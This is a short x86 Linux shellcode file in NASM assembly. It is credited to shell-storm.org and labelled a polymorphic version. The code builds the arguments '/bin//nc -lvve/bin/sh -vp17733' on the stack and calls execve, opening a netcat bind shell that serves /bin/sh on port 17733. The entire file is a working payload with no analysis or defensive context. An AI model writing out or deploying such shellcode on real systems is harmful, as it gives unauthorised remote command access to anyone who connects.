;http://shell-storm.org/shellcode/files/shellcode-804.php
;Author: Anonymous
;Site: http://chaossecurity.wordpress.com/
;Polymorphic version by Henry <nc-nlvp.party>
section .text
    global _start
_start:
xor eax,eax
push 0x37373333 ;7733
push 0x3170762d ;1pv-
mov edx, esp
push eax
push 0x68732f6e ;hs/n
push 0x69622f65 ;ib/e
push 0x76766c2d ;vvl-
mov ecx,esp
push eax
push 0x636e2f2f ;cn//
push 0x6e69622f ;nib/
mov ebx, esp
push eax
push edx
push ecx
push ebx
xor edx,edx
mov  ecx,esp
mov al,11
int 0x80
